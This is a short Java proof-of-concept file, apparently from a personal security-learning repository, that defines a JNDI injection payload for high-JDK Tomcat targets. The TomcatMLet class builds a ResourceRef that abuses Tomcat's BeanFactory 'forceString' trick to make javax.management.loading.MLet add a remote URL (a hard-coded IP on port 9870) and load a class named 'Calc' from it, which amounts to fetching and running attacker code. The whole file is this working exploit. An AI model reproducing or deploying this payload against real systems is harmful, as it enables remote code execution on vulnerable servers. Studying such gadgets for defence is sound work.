package com.xjjlearning.hack.java.highjdk.poc;

import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;

/**
 * Created by xjj on 2023/5/6.
 */

// 用来探测是否有类, 没有则抛出异常
// 通过 URLClassloader 去远程加载类
public class TomcatMLet implements Payload {

    @Override
    public ResourceRef getPayload() {

//        javax.management.loading.MLet
        ResourceRef ref = new ResourceRef("javax.management.loading.MLet", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "a=loadClass,b=addURL,c=loadClass"));
//        ref.add(new StringRefAddr("a", "javax.el.ELProcessor"));
        ref.add(new StringRefAddr("b", "http://47.95.7.37:9870/"));
        ref.add(new StringRefAddr("c", "Calc"));
        return ref;
    }
}
